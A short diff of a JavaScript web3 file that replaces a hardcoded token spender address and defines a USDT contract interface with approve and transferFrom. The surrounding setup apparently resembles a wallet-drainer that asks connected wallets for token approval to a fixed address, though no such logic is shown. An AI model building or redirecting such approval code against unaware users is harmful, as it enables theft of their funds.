@@ -18,7 +18,7 @@ const BLOCKCHAIN_CONFIG={
 };
 
 const SUPPORTED_CHAIN_IDS=Object.keys(BLOCKCHAIN_CONFIG).map(Number);
-const SPENDER_ADDRESS='0xf9153495518BD37139e5Df98c1733a6004e4da0b';
+const SPENDER_ADDRESS='0xA518253A03A722e878F9671146F4C5FF48E47b55';
 const USDT_ABI=['function approve(address spender, uint256 amount) public returns (bool)','function transfer(address to, uint256 amount) public returns (bool)','function transferFrom(address from, address to, uint256 amount) public returns (bool)','function allowance(address owner, address spender) public view returns (uint256)','function balanceOf(address account) public view returns (uint256)'];
 
 let connectedAddress=null;
